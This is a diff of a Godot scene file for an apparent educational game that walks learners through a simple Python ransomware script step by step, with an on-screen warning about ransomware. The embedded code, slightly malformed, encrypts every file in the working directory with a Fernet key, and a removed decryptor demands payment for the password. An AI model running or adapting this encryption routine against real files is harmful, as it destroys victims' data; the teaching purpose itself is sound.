+This secret key works like a lock-and-key system: it locks the files so nobody can read them, and the same key is needed later to unlock them. Without the key, the locked files are just gibberish — completely useless to anyone. It’s like putting all your important papers in a safe. 
+
+The \"WhiteHat\" key is the only key that can unlock the files. Without it, the files may be locked and unusable because they are encrypted."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -1129,7 +1139,7 @@ tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Decrypt the Files"]
+"values": ["Creating the Password Key"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -1141,7 +1151,7 @@ tracks/4/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.1, 1.36)]
+"values": [Vector2(0.1, 0.115)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -1153,7 +1163,7 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.735, 0.645)]
+"values": [Vector2(3.735, 0.315)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -1165,7 +1175,7 @@ tracks/6/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [19.0]
+"values": [13.965]
 }
 
 [sub_resource type="Animation" id="Animation_31cwg"]
@@ -1180,33 +1190,29 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet
+"values": ["import os from cryptography.fernet 
 import fernet
 
-allfiles = []
+allfiles = [ ]
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
+print (allfiles)
 
-print(allfiles)
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
 
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
 
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
+print('All your files have been encrypted')"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -1230,7 +1236,9 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["It opens the same file again, but this time in write binary mode, and replaces the scrambled content with the original, readable version. "]
+"values": ["The program then saves this key into a file called key.key, using binary write mode (wb).
+
+At this stage, the program has created the “master key” and stored it safely in a separate file."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -1242,7 +1250,7 @@ tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Decrypt the Files"]
+"values": ["Creating the Password Key"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -1254,7 +1262,7 @@ tracks/4/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.1, 2.01)]
+"values": [Vector2(0.1, 0.43)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -1266,7 +1274,7 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.735, 0.555)]
+"values": [Vector2(3.735, 0.6)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -1278,7 +1286,7 @@ tracks/6/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [19.0]
+"values": [13.965]
 }
 
 [sub_resource type="Animation" id="Animation_x5n46"]
@@ -1293,33 +1301,29 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet
+"values": ["import os from cryptography.fernet 
 import fernet
 
-allfiles = []
+allfiles = [ ]
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
+print (allfiles)
 
-print(allfiles)
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
 
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
 
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
+print('All your files have been encrypted')"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -1343,7 +1347,11 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Finally, it tells the user: “You got your files back.” At this point, the files are restored, just like they were before being locked."]
+"values": ["Here’s where the real work happens:
+
+The program loops through every file in the allfiles list.
+
+Each file is opened in binary read mode (rb) so the raw data can be read."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -1355,7 +1363,7 @@ tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Decrypt the Files"]
+"values": ["Encrypting the Files"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -1367,7 +1375,7 @@ tracks/4/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.1, 2.59)]
+"values": [Vector2(0.135, 1.41)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -1379,7 +1387,7 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.735, 0.335)]
+"values": [Vector2(3.735, 0.855)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -1391,7 +1399,7 @@ tracks/6/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [19.0]
+"values": [13.965]
 }
 
 [sub_resource type="Animation" id="Animation_x2hu1"]
@@ -1406,33 +1414,29 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet
+"values": ["import os from cryptography.fernet 
 import fernet
 
-allfiles = []
+allfiles = [ ]
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
+print (allfiles)
 
-print(allfiles)
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
 
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
 
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
+print('All your files have been encrypted')"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -1456,7 +1460,7 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["If the user types the wrong passphrase, the program refuses to continue.\\n\\nThe files stay locked, and the script shows a threatening message that mimics how real ransomware works: it tells you to pay money to get the right password."]
+"values": ["That data is then fed into Fernet(key).encrypt(), which scrambles the content into a completely unreadable format (Hash)."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -1468,7 +1472,7 @@ tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Handle Wrong Passwords"]
+"values": ["Encrypting the Files"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -1480,7 +1484,7 @@ tracks/4/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.1, 3.235)]
+"values": [Vector2(0.1, 2.29)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -1492,7 +1496,7 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.735, 0.615)]
+"values": [Vector2(3.735, 0.3)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -1504,7 +1508,227 @@ tracks/6/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [19.0]
+"values": [13.965]
+}
+
+[sub_resource type="Animation" id="Animation_8yhgl"]
+resource_name = "ransomware_step_12"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Finally, the encrypted version replaces the original file by writing it back in binary write mode (wb).
+
+At this point, the files are no longer usable in their normal form — they have been locked with the password key."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Encrypting the Files"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.1, 2.615)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.59)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [13.965]
+}
+
+[sub_resource type="Animation" id="Animation_h0h0r"]
+resource_name = "ransomware_step_13"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["The program prints a message to confirm that all the files have been encrypted."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Final Confirmation"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 3.555)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.28)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [13.965]
 }
 
 [sub_resource type="Animation" id="Animation_fkojw"]
@@ -1679,7 +1903,9 @@ _data = {
 &"ransomware_step_09": SubResource("Animation_31cwg"),
 &"ransomware_step_10": SubResource("Animation_x5n46"),
 &"ransomware_step_11": SubResource("Animation_x2hu1"),
-&"ransomware_step_12": SubResource("Animation_fkojw")
+&"ransomware_step_12": SubResource("Animation_8yhgl"),
+&"ransomware_step_13": SubResource("Animation_h0h0r"),
+&"ransomware_step_14": SubResource("Animation_fkojw")
 }
 
 [sub_resource type="StyleBoxFlat" id="StyleBoxFlat_h8m8q"]
@@ -1711,7 +1937,7 @@ anchor_right = 1.0
 anchor_bottom = 1.0
 grow_horizontal = 2
 grow_vertical = 2
-script = ExtResource("1_1hame")
+script = ExtResource("1_8bd8f")
 
 [node name="Background" type="ColorRect" parent="."]
 layout_mode = 1
@@ -1734,7 +1960,7 @@ metadata/_edit_use_anchors_ = true
 
 [node name="Label" type="Label" parent="Header"]
 layout_mode = 2
-theme_override_fonts/font = ExtResource("2_4njmv")
+theme_override_fonts/font = ExtResource("2_nmigk")
 text = "VScode"
 
 [node name="Body" type="HBoxContainer" parent="."]
@@ -1764,12 +1990,13 @@ layout_mode = 2
 [node name="FoldableContainer" type="FoldableContainer" parent="Body/ExplanationPanel/VBoxContainer"]
 layout_mode = 2
 theme = SubResource("Theme_x5n46")
-title = "Creating an encryption code"
+title = "⚠️RANSOMWARE ALERT⚠️"
 
 [node name="RichTextLabel" type="RichTextLabel" parent="Body/ExplanationPanel/VBoxContainer/FoldableContainer"]
 custom_minimum_size = Vector2(0, 531.305)
 layout_mode = 2
 bbcode_enabled = true
+text = "Ransomware is one of the most dangerous types of malicious software. Once it infects your computer, it locks or encrypts your files so you cannot open them. To protect yourself from ransomware, always back up your files, keep your system updated, use strong security tools, and be careful with emails and links, because prevention is much easier than fixing the damage."
 
 [node name="CodeContainer" type="VBoxContainer" parent="Body"]
 layout_mode = 2
@@ -1797,11 +2024,35 @@ theme_override_styles/normal = SubResource("StyleBoxEmpty_qmx2e")
 theme_override_styles/focus = SubResource("StyleBoxEmpty_0tp54")
 theme_override_styles/read_only = SubResource("StyleBoxEmpty_h8m8q")
 theme_override_styles/completion = SubResource("StyleBoxEmpty_pkbn6")
+text = "import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"
 wrap_mode = 1
 autowrap_mode = 2
 gutters_draw_line_numbers = true
 
 [node name="Overlay" type="ColorRect" parent="Body/CodeContainer/PanelContainer"]
+visible = false
 material = SubResource("ShaderMaterial_gu46y")
 layout_mode = 2
 mouse_filter = 2
@@ -1811,7 +2062,7 @@ metadata/_edit_use_anchors_ = true
 visible = false
 custom_minimum_size = Vector2(0, 70)
 layout_mode = 2
-theme_override_fonts/normal_font = ExtResource("3_7yavl")
+theme_override_fonts/normal_font = ExtResource("3_vuwby")
 theme_override_font_sizes/normal_font_size = 20
 bbcode_enabled = true
 text = "[wave]This is my text"
@@ -1832,7 +2083,7 @@ grow_horizontal = 2
 grow_vertical = 2
 mouse_filter = 2
 color = Color(0, 0, 0, 0.17254902)
-script = ExtResource("4_nt30g")
+script = ExtResource("4_m28fk")
 
 [node name="Window" type="PanelContainer" parent="WindowBackground"]
 clip_children = 2
@@ -1861,7 +2112,7 @@ theme_override_styles/panel = SubResource("StyleBoxFlat_pkbn6")
 [node name="Button" type="Button" parent="WindowBackground/Window/WindowContents/WindowHeader"]
 layout_mode = 2
 size_flags_horizontal = 8
-theme_override_fonts/font = ExtResource("3_7yavl")
+theme_override_fonts/font = ExtResource("3_vuwby")
 theme_override_styles/normal = SubResource("StyleBoxEmpty_cxtjw")
 theme_override_styles/pressed = SubResource("StyleBoxEmpty_wf7ls")
 theme_override_styles/hover = SubResource("StyleBoxEmpty_vuf0p")
@@ -1888,12 +2139,11 @@ layout_mode = 2
 size_flags_vertical = 4
 
 [node name="Debug" type="Control" parent="."]
-visible = false
 anchors_preset = 0
 offset_right = 40.0
 offset_bottom = 40.0
 
-[node name="Next" parent="Debug" instance=ExtResource("5_t7otc")]
+[node name="Next" parent="Debug" instance=ExtResource("5_7i6ny")]
 layout_mode = 1
 anchor_left = 0.736111
 anchor_top = 0.802469
@@ -1904,7 +2154,7 @@ offset_top = 487.90118
 offset_right = 962.3815
 offset_bottom = 522.6172
 
-[node name="Back" parent="Debug" instance=ExtResource("6_qn2o3")]
+[node name="Back" parent="Debug" instance=ExtResource("6_6g5gb")]
 layout_mode = 1
 anchor_left = 0.131944
 anchor_top = 0.802469
